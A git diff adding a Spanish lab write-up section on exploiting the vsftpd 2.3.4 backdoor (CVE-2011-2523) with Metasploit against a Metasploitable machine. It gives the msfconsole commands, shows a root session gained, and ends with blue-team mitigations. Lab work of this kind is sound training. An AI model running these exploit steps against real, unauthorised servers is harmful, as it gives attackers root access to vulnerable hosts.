@@ -60,3 +60,52 @@ existir. La solución es cerrar ese puerto con el firewall y auditar
 regularmente los puertos abiertos del sistema.
 
 ---
+
+
+## 2.2 · vsftpd 2.3.4 Backdoor — Metasploit
+
+**Herramienta:** Metasploit Framework
+
+**CVE:** CVE-2011-2523
+
+**¿Qué es esta vulnerabilidad?**
+En 2011 alguien comprometió el código fuente oficial de vsftpd 2.3.4
+e introdujo una backdoor. Cuando un usuario intenta hacer login con
+un usuario que contiene ":)" al final, el servidor abre una shell
+de root en el puerto 6200. Es una de las vulnerabilidades más famosas
+de la historia del FTP.
+
+**Comandos utilizados:**
+```bash
+msfconsole
+search vsftpd
+use 1
+set RHOSTS 192.168.85.129
+set LHOST 192.168.85.128
+run
+```
+
+**Resultado:**
+<img width="722" height="494" alt="image" src="https://github.com/user-attachments/assets/a8a0c1f2-cd24-41ee-8166-04ac07829ecf" />
+
+<img width="946" height="820" alt="image" src="https://github.com/user-attachments/assets/aa50bb18-6096-42bd-aca5-382ac7202ab3" />
+
+<img width="870" height="748" alt="image" src="https://github.com/user-attachments/assets/7efa289e-e570-4950-9d9e-7c9cf36dce4c" />
+
+<img aquí captura del exploit />
+
+<img width="408" height="160" alt="image" src="https://github.com/user-attachments/assets/965b00b4-d8f1-45d0-aee2-fdf733c3e1c7" />
+
+
+**Acceso conseguido:**
+- Usuario: root
+- Sistema: Ubuntu 8.04 Linux 2.6.24
+- Sesión Meterpreter abierta entre Kali y Metasploitable
+
+**Reflexión Blue Team — ¿Cómo se evita?**
+- Actualizar vsftpd a una versión no comprometida
+- Verificar siempre la integridad del software descargado (hash MD5/SHA)
+- Cerrar el puerto 21 si no es estrictamente necesario
+- Usar SFTP en vez de FTP — cifrado y más seguro
+
+---
